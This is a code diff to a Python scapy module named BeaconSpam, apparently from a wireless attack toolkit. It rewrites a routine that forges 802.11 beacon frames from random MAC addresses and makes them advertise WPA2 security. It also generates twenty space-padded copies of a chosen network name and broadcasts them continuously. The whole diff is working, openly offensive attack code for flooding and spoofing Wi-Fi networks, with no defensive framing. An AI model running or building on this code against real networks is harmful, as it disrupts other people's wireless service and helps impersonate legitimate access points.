@@ -2,33 +2,51 @@ import scapy.all as scapy
 import globals
 import time 
 import threading
+import random
 class BeaconSpam:
     def __init__(self):
         self.IFACE = globals.interface
         self._stop_event = threading.Event()
     def stop(self):
         self._stop_event.set()
-    def build_beacon_packet(self):
-        rand_mac = scapy.RandMAC()
-        packet = (scapy.RadioTap()/
-                  scapy.Dot11(type=0, subtype=8,
-                              addr1= "ff:ff:ff:ff:ff:ff",
-                              addr2= rand_mac,
-                              addr3= rand_mac)/
-                    scapy.Dot11Beacon(cap="ESS")/
-                    scapy.Dot11Elt(ID = 0, info=globals.selected_ssid, len=len(globals.selected_ssid))/
-                    scapy.Dot11Elt(ID = 1, info = (
-                        "\x82\x84\x8b\x96"
-                    ))/
-                    scapy.Dot11Elt(ID = 3, info = bytes([int(globals.channel) if globals.channel else 1])
-                    ))
+    def build_beacon_packet(self,ssid:str):
+        packet = (
+            scapy.RadioTap()/
+            scapy.Dot11(type=0, subtype=8,
+                addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
+                addr2=str(scapy.RandMAC()),
+                addr3=str(scapy.RandMAC())) /
+            scapy.Dot11Beacon(cap="ESS+privacy")/
+            scapy.Dot11Elt(ID='SSID', info=str(ssid), len=len(ssid))/
+            scapy.Dot11Elt(ID='RSNinfo', info=(
+                b'\x01\x00'
+                b'\x00\x0f\xac\x04'
+                b'\x02\x00'
+                b'\x00\x0f\xac\x04'
+                b'\x00\x0f\xac\x02'
+                b'\x01\x00'
+                b'\x00\x0f\xac\x02'
+                b'\x00\x00'))
+        )
         return packet
-    def send_beacon_packet(self):
+    def create_ssid_array(self):
+        ssids = []
+        while len(ssids) < 20:
+            random_num = random.randrange(0,30)
+            random_space = " " * random_num
+            new_ssid = globals.selected_ssid + random_space
+            if new_ssid in ssids:
+                pass
+            else:
+                ssids.append(new_ssid)
+        return ssids
+    def start_beacon_spam(self):
+        ssids = self.create_ssid_array()
         while not self._stop_event.is_set():
             try:
-                pkt = self.build_beacon_packet()
-                scapy.sendp(pkt, iface=self.IFACE, verbose=False)
-                time.sleep(0.1)
+                for ssid in ssids:
+                    pkt = self.build_beacon_packet(ssid)
+                    scapy.sendp(pkt, iface=self.IFACE, count=3, inter=0.01, verbose=False)
             except Exception as e:
                 print(f"Beacon send error: {e}")
-                time.sleep(0.1)
+                time.sleep(0.1)                
